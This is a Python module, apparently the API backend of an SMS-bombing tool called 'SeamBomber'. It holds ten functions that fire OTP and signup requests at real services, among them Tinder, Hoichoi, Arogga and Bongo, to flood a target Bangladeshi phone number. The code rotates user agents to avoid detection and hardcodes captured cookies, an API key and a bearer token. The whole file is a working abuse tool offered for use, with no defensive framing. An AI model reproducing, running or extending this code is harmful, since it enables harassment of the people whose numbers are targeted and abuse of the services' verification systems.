# API Data For SeamBomber
# A Product Of Seam

import requests
from requests.structures import CaseInsensitiveDict
import random
import sys

#Random U seragents
useragentList = ["Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G991B/G991BXXU3AUF6) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; Redmi Note 9S Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/363.0.0.30.112;]"]

useragent = random.choice(useragentList)

#Access Checking Function
def check():
    file = open("seam.py", "r").read()
    if not ("Author : Sh-Seam" in file) or not ("GitHub  : https://github.com/Sh-Seam" in file) or not ("SeamBomber" in file) or not ("https://raw.githubusercontent.com/Sh-Seam/seam/main/more/.version" in file):
        print("\n\033[92m[\033[91m!\033[92m] You Have No Permission To Access This Tool!\u001b[34;1m")
        print("\033[92m[\033[91m!\033[92m] Delete This Tool and git clone Again To Use It!\u001b[34;1m")                       
        print("\n\033[92m[\033[91m*\033[92m] Tool Link: \033[37mhttps://github.com/Sh-Seam/seam\n\u001b[34;1m")                                                                                                                                                           
        sys.exit()

#Check Permission
check()

#1 api Hoichoi
def api1(number):
    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
    data = {"requestType" : "send","phoneNumber" : "+880"+number,"emailConsent" : "true","whatsappConsent" : "true"}
    
    try:
        response = requests.post(url, json=data).status_code
        return response
    except:
        return "error"


#2 Tinder
def api2(number):
    url = "https://api.gotinder.com/v2/auth/sms/send"
    data = {
        "phone_number": "880"+number
        }
    params= {
                    "auth_type": "sms",
                    "locale": "ru"
                }
    try:
        response = requests.post(url, json=data, params=params).status_code
        return response
    except:
        return "error"

#3 BiosScope
def api3(number): 
    url = "https://www.bioscopelive.com/en/login/send-otp"
    headers = {"Host" : "www.bioscopelive.com", "upgrade-insecure-requests" : "1", "user-agent" : useragent, "accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-gpc" : "1", "sec-fetch-site" : "none", "sec-fetch-mode" : "navigate", "sec-fetch-dest" : "document", "accept-language" : "en-US,en;q=0.9"}
    params = {"phone" : "880"+number, "operator" : "bd-otp"}
    try:
        response = requests.get(url, params=params, headers=headers).status_code
        return response
    except:
        return "error"

#4 Hungry Naki
def api4(number):
    data = {'query': '\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: ""\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n', 'variables': {'phone': number, 'country': '880', 'uuid': '64b9bb81-93f3-4757-9e92-9cfbf34d8039', 'osVersionCode': 'Linux armv8l', 'deviceBrand': 'Chrome', 'deviceModel': '89', 'requestFrom': 'U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s='}}
    url = "https://api-v4-2.hungrynaki.com/graphql"
    
    try:
        response = requests.post(url, json=data).status_code
        return response
    except:
        return "error"

#5 RedX
def api5(number):
    url = "https://api.redx.com.bd/v1/user/signup"
    data = {"name":number,"phoneNumber":number,"service" : "redx"}
    headers ={
        "Accept":"application/json, text/plain, */*",
        "Content-Type":"application/json;charset=utf-8",
        "Cookie":"_ga=GA1.1.819055803.1670493332; _gid=GA1.3.919242569.1670493332; _gat_gtag_UA_159382318_1=1; _fbp=fb.2.1670493331794.1833360902; _hjSessionUser_2064965=eyJpZCI6IjEyMDFkNzcyLTFiZmItNTg2ZS05YzlkLTJjMmQ3NWE0NzNlNiIsImNyZWF0ZWQiOjE2NzA0OTMzMzE3ODksImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2064965=eyJpZCI6IjRlMDdlYWUyLWViNWQtNDJkZi1iZWRmLWNjNTE3NmEzNGRhOCIsImNyZWF0ZWQiOjE2NzA0OTMzMzE4MDksImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _ga_ZTN98XM7BX=GS1.1.1670493333.1.0.1670493333.60.0.0",
        "Host":"api.redx.com.bd",
        "Origin":"https://redx.com.bd",
        "Referer":"https://redx.com.bd/",
        "User-Agent": useragent,
    }
    try:
        response = requests.post(url, json=data, headers=headers).status_code
        return response
    except:
        return "error"


#6 Fudesh
def api6(number):
    url = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
    data = {"msisdn": number}
    response = requests.post(url, json=data)
    if ("otp_sent" in response.text.lower()):
        return 200
    elif ("user_blocked" in response.text.lower()):
        return "error"
    else:
        return 200

#7 Quize Girl
def api7(number):
    url = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/json"
    data = {"phone":number,"country_code" : "+880","fcm_token" : "null"}
    try:
        response = requests.post(url, headers=headers, json=data).status_code
        return response
    except:
        return "error"

#8 Arogga
def api8(number):
    url = "https://api.arogga.com/v1/auth/sms/send"
    headers = { "Host" : "api.arogga.com", "accept" : "application/json, text/plain, */*", "user-agent" : useragent, "sec-gpc" : "1", "origin" : "https://www.arogga.com", "sec-fetch-site" : "same-site", "sec-fetch-mode" : "cors", "sec-fetch-dest" : "empty", "referer" : "https://www.arogga.com/", "accept-language" : "en-US,en;q=0.9" }
    data = {"mobile" : "+880"+number, "fcmToken" : "", "referral" : ""}
    try:
        response = requests.post(url, headers = headers, data = data).status_code
        return response
    except:
        return "error"


#9 SWAP
def api9(number):
    url = "https://prodapi.swap.com.bd/api/v1/send-otp/login?mobile_number=880"+number
    headers = {
        "User-Agent": useragent,
	
        "x-authorization": "QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3"}
    data = {"mobile_number":"0"+number,"referral":"false"}
    try:
        response = requests.post(url, headers = headers, data = data).status_code
        return response
    except:
        return "error"

#10   Bongo Solution
def api10(number):
    url = "https://api.bongo-solutions.com/auth/api/login/send-otp"
    headers={"Host": "api.bongo-solutions.com",
    "Connection": "keep-alive",
    "Content-Length": "43",
    "Origin": "https://bongobd.com",
    "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJyb2xlcyI6WyJST0xFX1VTRVJfQklPU0NPUEUiLCJST0xFX1VTRVIiLCJST0xFX1VTRVJfQU5PTllNT1VTIl0sInVzZXJuYW1lIjoiYW5vbnltb3VzIiwiY2xpZW50X2xvZ2luX2lkIjo0OTUxOTg3MDA4MiwiY2xpZW50X2lkIjpudWxsLCJwbGF0Zm9ybV9pZCI6ImFiZmVhNDYyLWY2NGQtNDkxZS05Y2Q5LTc1ZWUwMDFmNDViMCIsImJvbmdvX2lkIjoiZDQzMjJkMTUtMmE5YS00ZDI2LWI0YmYtZjQ2NDAzMWQ5MmMxIiwiaWF0IjoxNjI5ODk4Njc4LCJleHAiOjE2MzI0OTA2ODguMH0.CZYJTcvK25cKKaIsfyH1jsdlbsT_6o-KlxyW4GGda92isprdI9KhzG_D-WoJT_-PHU1iTWU2p4O9P9mk9627x7u8pLMKLOPcs0rt4qVUIIu2LbCo27aJcw7zi7Tlp37ZXmMD80st8TVhK4y8nlmdPRkgmBgqnbyimNlLyjMfz9N9IQZ5rM_CngA6yptYDb3WIu-eeLtaYUhGa7PHkiCBTw4SziJDZQz-Wh6axBUuiGq-8izflZOK6OQBZ-bkQZWWjOwhXow0z4XaSHS5u66vglKKpi5HMQEK9HTGnOp7RUtH2bQp58crWTsL0prFpOaeH202hPK3_ssvTA24M9dM_N4N8NdXaEU_zy5bL90KInRaMshd2ejtiisu11DxL6Nqtpv8ZvVqqgBeriMZ4uMtXMsVBNArRJCiXHAMGZg3g5VvzfMTMyw58lUW__3voBJzN8s5MZDs6lR1fzIpuyoKMJW4SAkTSD12oYnNzyDBtL7Ubj9qSfrDKYGbM0tKGMN6xJKwLP9isApEdw72II3v2X-LyWgkANowth8EZo7MU-a09XPMg-Axrjh2zogP37HioYQ3LGFqOuBrvzgTFm8wwrmcCbiyP5bdJMFEq8SyP0Ol_UYjogQ_6pI9NIOHJDMxnqSLFznsy2MWXfaVJ1vJVw6DtmJz2GoYrGgFsx5xxtk",
    "content-type": "application/json",
    "accept": "application/json",
    "platform-id": "abfea462-f64d-491e-9cd9-75ee001f45b0",
    "access-code": "QkQ%3D",
    "User-Agent": useragent,
    "Save-Data": "on",
    "Referer": "https://bongobd.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,bn;q=0.8"}
    data ={"operator":"all","msisdn":"880"+number}
    try:
        response = requests.post(url, headers=headers, json=data).status_code
        return response
    except:
        return "error"
